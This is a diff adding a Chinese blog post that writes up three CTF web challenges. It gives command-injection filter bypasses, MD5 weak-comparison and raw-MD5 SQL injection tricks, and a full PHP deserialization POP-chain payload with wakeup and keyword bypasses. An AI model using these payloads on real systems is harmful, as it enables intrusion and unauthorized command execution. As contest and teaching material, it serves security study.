@@ -376,7 +376,74 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          
+          <p>强网杯没怎么认真打，这里就简单分享一下其中比较简单的三道题的思路。<br>由于本人实力有限，讲的比较基础，希望各位师傅见谅。<br>一、主动。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/98749.jpg" alt=""></p>
+<p>if里面的正则表示如果参数ip里出现flag那么就会显示flag。</p>
+<p>看见system首先想到命令执行，有很多种解法：</p>
+<p>1、?ip=127.0.0.1|cat%20fla\g.php<br>利用linux的反斜杠绕过。</p>
+<p>2、?ip=127.0.0.1;cat%20????.php<br>使用通配符绕过。</p>
+<p>3、?ip=;cat fl’’ag.php<br>引号绕过。</p>
+<p>4、?ip=;cat <code>echo &#39;Li9mbGFnLnBocAo=&#39; | base64 -d</code><br>base64编码绕过。比较麻烦，不推荐。</p>
+<p>5、?ip=;a=fl;b=ag;cat $a$b.php<br>变量赋值绕过。</p>
+<p>还有的就不一一列举了。</p>
+<p>二、funhash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/76574.jpg" alt=""></p>
+<p>首先分析一下源码，需要通过三个阶段，然后var_dump出$row内容。</p>
+<p>level1应该是本题最难的点了，如果你搜不到的话。<br>这里给出碰撞脚本供大家参考：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905223455.png" alt=""></p>
+<p>参考链接：<a href="https://medium.com/@sbasu7241/hsctf-6-ctf-writeups-a807f0b25ae4">https://medium.com/@sbasu7241/hsctf-6-ctf-writeups-a807f0b25ae4</a></p>
+<p>大概跑几分钟就能出结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905224125.png" alt=""></p>
+<p>最后提一下原理，因为是弱类型比较，所以可以用科学计数法绕过。</p>
+<p>level2和level3就没什么难度了。</p>
+<p>level2数组绕过即可。</p>
+<p>level3：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905224353.png" alt=""></p>
+<p>md5($password,true)<br>先给出答案：<br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: ‘or’6]!r,b</p>
+<p>当raw的值为true时，返回16位原始二进制格式的字符串。不是普通的二进制（0，1），而是  ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  这种。</p>
+<p>上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p>
+<p>这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p>
+<p>然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = ‘admin’ and password = ‘’or’6�]��!r,��b’</p>
+<p>为什么password = ‘’or’6�]��!r,��b’的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然这里不能以0开头。</p>
+<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。（不只是1开头，只要是数字开头都是可以的）</p>
+<p>payload :  ?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</p>
+<p>三、web辅助</p>
+<p>分析源码。</p>
+<p>Class.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905234149.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905234114.png" alt=""></p>
+<p>这里存在着各种类，也是我们构造pop链的关键，我们的目的是为了触发最后的cat /flag</p>
+<p>common.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905234243.png" alt=""></p>
+<p>这里面的read，write有与’\0\0’, chr(0).””.chr(0)相关的替换操作，还有一个check对我们的序列化的内容进行检查，判断是否存在关键字name，这里也是我们需要绕过的一个地方</p>
+<p>Index.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905234322.png" alt=""></p>
+<p>获取我们传入的username和password，并将其序列化储存</p>
+<p>Play.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/90.jpg" alt=""></p>
+<p>在写入序列化的内容之后，访问play.php，如果我们的操作通过了check，然后经过了read的替换操作之后，便会进行反序列化操作。</p>
+<p>分析：<br>反推，我们的最终目的是要触发jungle类中的KS方法，从而cat /flag，而触发KS方法得先触发__toString方法，一般来说，在我们使用echo输出对象时便会触发。找了很久才发现是stristr($this-&gt;name, ‘Yasuo’)这个地方会触发。（在5.x版本前，只有echo能触发toString操作，新版本所有的字符串操作都能触发了）接下来，就需要触发gank函数，所以需要利用midsolo的invoke。topsolo类中的TP方法中，使用了name()，如果我们将一个对象赋值给name，这里便是以调用函数的方式调用了一个对象，此时会触发invoke方法。</p>
+<p>此时思路就非常的清晰了：<br>topsolo-&gt;<strong>destruct()-&gt;TP()-&gt;$name()-&gt;midsolo-&gt;</strong>invoke()-&gt;Gank()-&gt;stristr()-&gt;jungle-&gt;__toString()-&gt;KS()-&gt;syttem(‘cat /flag’)</p>
+<p>构造POP链：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200906004151.png" alt=""></p>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>这还没有结束。首先，由于midsolo中的__wakeup会在反序列化过程中覆盖掉我们的传值，因此我们要将midsolo的1改成2来绕过。（老套路了，序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行）</p>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BO%3A6%3A%22jungle%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>“name”检测绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200906005726.png" alt=""></p>
+<p>使用十六进制绕过\6e\61\6d\65，并将s改为S</p>
+<p>O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>字符串逃逸</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200906010326.png" alt=""></p>
+<p>可以看到对象topsolo，midsolo被s:102，所包裹，我们要做的就是题目环境本身的替换字符操作从而达到对象topsolo，midsolo从引号的包裹中逃逸出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200906010548.png" alt=""></p>
+<p>在反序列化操作前，有个read的替换操作，字符数量从5位变成3位，合理构造username的长度，经过了read的替换操作后，最后将”;s:7:”\0\0pass”;s:126吃掉，需要吃掉的长度为23，因为5-&gt;3，所以得为2的倍数，需要在password中再填充一个字符C，变成24位，所以我们一共需要构造12个\0\0来进行username填充，得到username</p>
+<p>username=\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0</p>
+<p>在password中补上被吃掉的pass部分，构造password的提交内容</p>
+<p>password=C”;s:7:”\0*\0pass”;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>最后</p>
+<p>?username=\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0&amp;password=C”;s:7:”\0*\0pass”;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p>flag在play.php。</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
